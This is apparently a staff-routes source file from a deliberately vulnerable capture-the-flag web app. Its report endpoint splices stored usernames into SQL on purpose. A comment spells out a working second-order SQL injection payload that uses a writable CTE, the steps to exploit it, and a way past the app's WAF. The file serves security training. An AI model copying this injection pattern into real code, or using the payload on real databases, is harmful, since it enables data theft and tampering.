/**
 * Staff routes
 * AUTH-04: flag in staff queue
 * INJ-01: second-order SQLi trigger (staff_bot runs report)
 * BAC-02: flag in order queue on first staff-auth page load
 */
'use strict';

const express = require('express');
const { Order, User, sequelize, QueryTypes } = require('../models');
const { requireAuth, requireRole } = require('../middleware/auth');
const { getFlag } = require('../utils/flags');

const router = express.Router();

router.use(requireAuth);
router.use(requireRole('staff', 'manager', 'admin'));

// ──────────────────────────────────────────────
// GET /api/staff/queue
// AUTH-04: flag here (requires staff role)
// BAC-02: flag displayed on first staff page load
// ──────────────────────────────────────────────
router.get('/queue', async (req, res) => {
  try {
    const orders = await Order.findAll({
      where: { status: ['pending', 'confirmed'] },
      order: [['created_at', 'ASC']],
      limit: 50
    });

    const auth04Flag = getFlag('auth04');
    const bac02Flag = getFlag('bac02');

    res.json({
      queue: orders.map(o => ({
        id: o.id,
        status: o.status,
        total_price_cents: o.total_price_cents,
        created_at: o.created_at
      })),
      flag: auth04Flag,  // AUTH-04: accessible by staff role
      staff_notice: bac02Flag  // BAC-02: displayed on first staff-authenticated load
    });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch queue' });
  }
});

// ──────────────────────────────────────────────
// POST /api/staff/report
// INJ-01 trigger: staff_bot calls this
// Raw query includes users.username (second-order SQL fragment executes here)
// ──────────────────────────────────────────────
router.post('/report', async (req, res) => {
  try {
    // Step 1: Safely fetch all customer records (parameterized — stores fine)
    const customers = await sequelize.query(
      "SELECT id, username, display_name, bio FROM users WHERE role = 'customer'",
      { type: QueryTypes.SELECT }
    );

    if (customers.length === 0) {
      return res.json({ report: [], generated_at: new Date().toISOString() });
    }

    // ──────────────────────────────────────────────
    // INJ-01 VULNERABILITY: second-order SQL injection
    //
    // Each customer's username is spliced directly into a per-row CTE query:
    //   WITH sampled_users AS ( SELECT '<username>' AS username, '<id>' AS user_id )
    //   SELECT su.username, su.user_id, ... FROM sampled_users su ...
    //
    // Each customer runs in its own sequelize.query call. The -- comment in the
    // injected username silences everything to the right of SELECT 1 in that row's
    // statement only — other customers' queries are unaffected.
    //
    // Working payload — register with this username (replace TARGET_UUID with victim UUID):
    //   x' AS username, '' AS user_id), update_op AS (UPDATE users SET bio=(SELECT value FROM secrets WHERE key='inj01') WHERE id='TARGET_UUID' RETURNING 1) SELECT 1 --
    //
    // Per-row assembly with that payload produces:
    //   WITH sampled_users AS ( SELECT 'x' AS username, '' AS user_id ),
    //   update_op AS (UPDATE users SET bio=(SELECT ...) WHERE id='TARGET_UUID' RETURNING 1)
    //   SELECT 1 -- ' AS username, '<id>' AS user_id ) SELECT su.username ...
    //
    // PostgreSQL executes writable CTEs unconditionally regardless of whether the
    // main query references them. The UPDATE fires as a side effect; SELECT 1 is
    // the main result (the -- comments out the rest of the template).
    //
    // Two-registration process:
    //   1. Register a victim account; note its UUID from GET /api/user/profile
    //   2. Register an attacker account with the payload above, substituting victim UUID
    //   3. Wait up to 60s for staff_bot to POST /api/staff/report
    //   4. Log in as victim; GET /api/user/profile — bio field contains INJ-01 flag
    //
    // WAF bypass: the payload contains no UNION SELECT, ' OR, <script>, or event
    // handler patterns — only a subquery with UPDATE — so it passes at registration.
    //
    // Second-order because:
    //   1. Registration stores the username safely via parameterized INSERT
    //   2. The payload executes only when staff_bot POSTs /api/staff/report
    // ──────────────────────────────────────────────

    // Execute one query per customer (VULNERABLE: username spliced raw into SQL).
    // Per-row isolation: a bad or injected username only affects its own statement.
    const reportRows = [];
    for (const c of customers) {
      const rowSql =
        `WITH sampled_users AS ( SELECT '${c.username}' AS username, '${c.id}' AS user_id ) ` +
        `SELECT su.username, su.user_id, COUNT(o.id) AS order_count, ` +
        `COALESCE(SUM(o.total_price_cents), 0) AS total_spent_cents ` +
        `FROM sampled_users su ` +
        `LEFT JOIN orders o ON o.user_id = su.user_id ` +
        `GROUP BY su.username, su.user_id ` +
        `ORDER BY total_spent_cents DESC`;
      try {
        const rows = await sequelize.query(rowSql);
        reportRows.push(...rows[0]);
      } catch (rowErr) {
        // Log and continue — injected SQL may have already fired as a side effect
        console.error('[staff] Report row error (injected SQL may have fired):', rowErr.message);
      }
    }

    res.json({
      report: reportRows,
      generated_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('[staff] Report generation error:', err.message);
    res.status(500).json({ error: 'Report generation failed: ' + err.message });
  }
});

// ──────────────────────────────────────────────
// POST /api/staff/orders/:id/notes
// Staff adds internal notes to orders
// ──────────────────────────────────────────────
router.post('/orders/:id/notes', async (req, res) => {
  try {
    const { notes } = req.body;
    const order = await Order.findByPk(req.params.id);
    if (!order) return res.status(404).json({ error: 'Order not found' });

    order.internal_notes = notes;
    order.updated_at = new Date();
    await order.save();

    res.json({ message: 'Notes saved', order_id: order.id });
  } catch (err) {
    res.status(500).json({ error: 'Failed to save notes' });
  }
});

// ──────────────────────────────────────────────
// PATCH /api/staff/orders/:id/status
// Staff fulfils an order by updating its status
// Allowed transitions: pending → confirmed → delivered; also supports cancelled
// ──────────────────────────────────────────────
router.patch('/orders/:id/status', async (req, res) => {
  try {
    const { status } = req.body;
    const ALLOWED_STATUSES = ['confirmed', 'delivered', 'cancelled'];
    if (!status || !ALLOWED_STATUSES.includes(status)) {
      return res.status(400).json({
        error: `Invalid status. Allowed values: ${ALLOWED_STATUSES.join(', ')}`
      });
    }

    const order = await Order.findByPk(req.params.id);
    if (!order) return res.status(404).json({ error: 'Order not found' });

    const prev = order.status;
    order.status = status;
    order.updated_at = new Date();
    await order.save();

    res.json({
      message: 'Order status updated',
      order_id: order.id,
      previous_status: prev,
      new_status: status
    });
  } catch (err) {
    res.status(500).json({ error: 'Failed to update order status' });
  }
});

module.exports = router;
